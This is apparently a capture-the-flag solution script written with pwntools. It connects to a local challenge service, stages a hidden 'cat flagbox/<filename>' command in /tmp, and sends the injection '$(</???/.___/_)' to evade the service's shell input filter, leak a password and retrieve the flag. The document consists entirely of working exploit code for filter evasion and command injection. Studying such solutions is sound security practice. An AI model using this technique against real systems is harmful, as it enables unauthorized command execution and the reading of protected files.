from pwn import *
import os

io = remote("0.0.0.0",9023);

io.recvuntil(b"is in flagbox/");
filename = io.recvline().strip().decode();
io.info("Filename: " + filename);

os.system(f'mkdir -p /tmp/.___ && echo "cat flagbox/{filename}" > /tmp/.___/_');
io.recvuntil(b"$ ");
io.sendline(b"$(</???/.___/_)");

password = io.recv(32);
io.info("Password: " + password.decode());

io.sendline(password);
io.recvuntil(b"Congratz! here is flag : ");
flag = io.recv(100).decode();
io.info("Flag: " + flag);
